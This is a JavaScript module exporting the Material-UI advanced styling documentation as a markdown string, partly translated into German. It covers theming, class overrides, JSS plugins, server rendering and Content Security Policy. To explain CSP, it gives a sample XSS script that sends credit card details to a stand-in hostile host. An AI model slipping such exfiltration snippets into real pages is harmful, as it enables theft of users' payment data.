module.exports = "# Erweitert\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Anschlie√üend k√∂nnen Sie in den Stilfunktionen auf das Designobjekt zugreifen.\n\n> This example creates a new theme. See the [theming section](/customization/theming/) for how to customize the default Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Zugriff auf das Theme in einer Komponente\n\nM√∂glicherweise m√ºssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Verschachtelung des Themes\n\nSie k√∂nnen mehrere Theme Provider verschachteln. Dies kann sehr n√ºtzlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nDas innere Theme ** √ºberschreibt** das √§u√üere Theme. Sie k√∂nnen das √§u√üere Theme erweitern, indem Sie eine Funktion bereitstellen:\n\n```jsx\n<ThemeProvider theme={‚Ä¶} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## √úberschreiben der Styles `classes` Eigenschaft\n\nDie `makeStyle` (Hook-Generator) und `withStyles` (HOC) APIs erm√∂glichen die Erstellung mehrerer Stilregeln pro Stylesheet. Jede Stilregel hat einen eigenen Klassennamen. Die Klassennamen werden der Komponente mit der `classes` Variable zur Verf√ºgung gestellt. Dies ist besonders n√ºtzlich, wenn Sie verschachtelte Elemente in einer Komponente formatieren.\n\n```jsx\n// Ein Stylesheet\nconst useStyles = makeStyles({\n  root: {}, // eine Stil Regel\n  label: {}, // eine verschachtelte Regel\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        verschachtelt\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nDie Klassennamen sind jedoch h√§ufig nicht deterministisch. Wie kann eine √ºbergeordnete Komponente den Stil eines verschachtelten Elements √ºberschreiben?\n\n### `withStyles`\n\nDies ist der einfachste Fall. Die umschlossene Komponente akzeptiert die `classes` Eigenschaft, welches einfach die mit dem Stylesheet gelieferten Klassennamen zusammengef√ºhrt wird.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nDie Hook-API erfordert etwas mehr Arbeit. Sie m√ºssen die √ºbergeordneten Eigenschaften als erstes Argument an den Hook √ºbergeben.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS-Plugins\n\nJSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie ben√∂tigen ausw√§hlen k√∂nnen. Sie bezahlen nur f√ºr den Leistungsaufwand, den Sie verwenden.\n\nNicht alle Plugins sind standardm√§√üig in der Material-UI verf√ºgbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n\nSelbstverst√§ndlich k√∂nnen Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String-Vorlagen\n\nWenn Sie die CSS-Syntax gegen√ºber JSS bevorzugen, k√∂nnen Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) Plugin verwenden.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nBeachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterst√ºtzt.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS-Injektionsreihenfolge\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nStandardm√§√üig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingef√ºgt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.\n\n### injectFirst\n\nDer `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzuf√ºgen (weniger Priorit√§t):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Mit Stil versehene Komponenten k√∂nnen die Stile von Material-UI √ºberschreiben. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nDas Einf√ºgen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // üîµ\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // üî¥\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red üî¥ wins.\n  return <div className={className} />;\n}\n```\n\nDie Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.\n\n### insertionPoint\n\nJSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzuf√ºgen der Platzierung des `Einf√ºgepunkts` innerhalb Ihres HTML-Heads k√∂nnen Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.\n\n#### HTML-Kommentar\n\nAm einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzuf√ºgen, der bestimmt, wo JSS die Stile einf√ºgt:\n\n```html\n<head>\n  <!-- jss-insertion-point -->\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, k√∂nnen Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einf√ºgepunkt angeben, z. B. `<noscript>`:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, k√∂nnen Sie die JavaScript `document.createComment()` API verwenden:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-Rendering\n\nIn diesem Beispiel wird ein Html-String zur√ºckgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.\n\nRefer to [this example Gatsby project](https://github.com/Foso/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nSie m√ºssen √ºber eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/Foso/material-ui/blob/master/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzuf√ºgen.\n\nSiehe [dieses Beispielprojekt](https://github.com/Foso/material-ui/blob/master/examples/nextjs) f√ºr ein aktuelles Verwendungsbeispiel.\n\n## Klassennamen\n\nDie Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.\n\n### Standard\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Nehmen wir den folgenden Stil als Beispiel:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nDadurch wird ein Klassenname wie `makeStyles-root-123` generiert.\n\nSie m√ºssen die `Klassen` Eigenschaft einer Komponente verwenden, um die Styles zu √ºberschreiben. Die nicht deterministische Natur der Klassennamen erm√∂glicht die Stilisolation.\n\n- In der **Entwicklung** lauten der Klassenname: `.makeStyles-root-123` nach dieser Logik:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### Mit `@material-ui/core`\n\nDie generierten Klassennamen der `@material-ui/core` Komponenten verhalten sich anders. Wenn die folgenden Bedingungen erf√ºllt sind, sind die Klassennamen **deterministisch**:\n\n- Es wird nur ein Themeanbieter verwendet (**Keine Verschachtelung von Themes**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nDiese Bedingungen werden bei den h√§ufigsten Anwendungsf√§llen von `@material-ui/core` erf√ºllt. Zum Beispiel dieses Stylesheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* ‚Ä¶ */ },\n  label: { /* ‚Ä¶ */ },\n  outlined: {\n    /* ‚Ä¶ */\n    '&$disabled': { /* ‚Ä¶ */ },\n  },\n  outlinedPrimary: {\n    /* ‚Ä¶ */\n    '&:hover': { /* ‚Ä¶ */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngeneriert die folgenden Klassennamen, die Sie √ºberschreiben k√∂nnen:\n\n```css\n.MuiButton-root { /* ‚Ä¶ */ }\n.MuiButton-label { /* ‚Ä¶ */ }\n.MuiButton-outlined { /* ‚Ä¶ */ }\n.MuiButton-outlined.Mui-disabled { /* ‚Ä¶ */ }\n.MuiButton-outlinedPrimary: { /* ‚Ä¶ */ }\n.MuiButton-outlinedPrimary:hover { /* ‚Ä¶ */ }\n```\n\n*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*\n\nDie Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) m√ºhsam sein, wo Sie die classes Eingenschaft definieren m√ºssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; üíö\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; üíî\n    }\n    &:hover fieldset {\n      border-color: yellow; üíõ\n    }\n    &.Mui-focused fieldset {\n      border-color: green; üíö\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Globales CSS\n\n### `jss-plugin-global`\n\nDas [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie k√∂nnen es verwenden, um globale Klassennamen zu definieren.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nSie k√∂nnen auch JSS-generierte Klassennamen mit globalen Namen kombinieren.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS-Pr√§fix\n\nJSS verwendet Featureerkennung, um die korrekten Pr√§fixe anzuwenden. [Seien Sie nicht √ºberrascht](https://github.com/Foso/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Pr√§fix sehen k√∂nnen. Ihr Browser ben√∂tigt es wahrscheinlich nicht.\n\n## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)\n\n### Was ist CSP und warum ist es n√ºtzlich?\n\nGrunds√§tzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zur√ºckgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen f√ºr XSS anf√§lligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, k√∂nnte ein Angreifer Folgendes eingeben:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n</script>\n```\n\nDiese Sicherheitsanf√§lligkeit erm√∂glicht es dem Angreifer, irgendetwas auszuf√ºhren. Mit einem sicheren CSP-Header l√§dt der Browser dieses Skript jedoch nicht.\n\nWeitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Wie kann man CSP implementieren?\n\nUm CSP mit Material-UI (und JSS) verwenden zu k√∂nnen, m√ºssen Sie eine Nonce verwenden. Eine Nonce ist eine zuf√§llig generierte Zeichenfolge, die nur einmal verwendet wird. Daher m√ºssen Sie eine Server-Middleware hinzuf√ºgen, um f√ºr jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie f√ºr einen grundlegenden √úberblick weiter.\n\nEine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie k√∂nnen so erstellen:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nEs ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header k√∂nnte mit der angewendeten Nonce so aussehen:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nWenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers √ºbergeben.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nDann m√ºssen Sie dieses Nonce an JSS √ºbergeben, damit es den nachfolgenden `<style>`-Tags hinzugef√ºgt werden kann.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nSie m√ºssen diesen Header unabh√§ngig davon angeben, ob SSR verwendet wird oder nicht. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```\n"